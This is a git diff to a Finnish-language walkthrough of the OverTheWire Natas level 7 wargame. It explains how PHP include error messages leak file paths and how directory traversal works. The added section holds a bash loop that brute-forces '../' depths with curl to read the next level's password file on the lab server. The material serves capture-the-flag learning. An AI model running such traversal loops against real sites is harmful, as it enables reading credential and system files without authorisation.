@@ -50,7 +50,9 @@ Jatketaan, kunnes ei enää tule virhettä vaan sisältö ladataan. Tyypillisest
 
 ## Vihjeitä sijainnista?
 
-Jos saa virheilmoituksen kuten; `Warning: include(home/etc/...) in /var/www/natas/natas7/index.php`
+Jos saa virheilmoituksen kuten; `Warning: include(home/etc/...) in /var/www/natas/natas7/index.php`.
+On mahdollista tällainen tai muuten vastaava web-sovellus/sivusto testaessa kuten saa suoraan PHP:n koodikielen virheilmoituksensa kuten; `Warning: include(home/etc/natas_webpass/natas8): failed to open stream...` 
+Tämä toisi vihjettä _hakkerille_ - ja juuri tämä on asia, jota ei saisi tapahtua virallisesti tuotannonympäristössä.
 
 Tämä kertoo jo, että `index.php` sijaitsee hakemistossa `/var/www/natas/natas7/`. Nyt voidaan laskea tarvittavat `../` -tasot tarkasti:
 
@@ -69,6 +71,19 @@ Jos PHP:n virheilmoituksia ei näytetä ollenkaan (esim. virheenkäsittely pois 
 ---
 
 # Kali Linux - terminaalissa 
+
+Aikaisemman harjoittuksen kannalta onko ainoa tapa testata `../` polkun selvittämistä, että kyllä jos ei tiedetä tasan tarkkalleen oikeeta polkua.
+Directory traversal -hyökkäys perustuu siihen, että yrität suhteellisesti mennä ylöspäin hakemistorakenteessa, kunnes pääset johonkin arkaluontoiseen tiedostoon.
+
+perus voi kokeilla tätä bash komentoa ja tämä on for-loop, periaatteessa skriptinäkin toimii ja tämä on _brute-force traversaliksi_;
+```
+for i in $(seq 1 10); do
+  path=$(printf "../%.0s" $(seq 1 $i))
+  curl "http://natas7.natas.labs.overthewire.org/index.php?page=${path}etc/natas_webpass/natas8" --user natas7:<salasana>
+done
+```
+
+
 
 
 
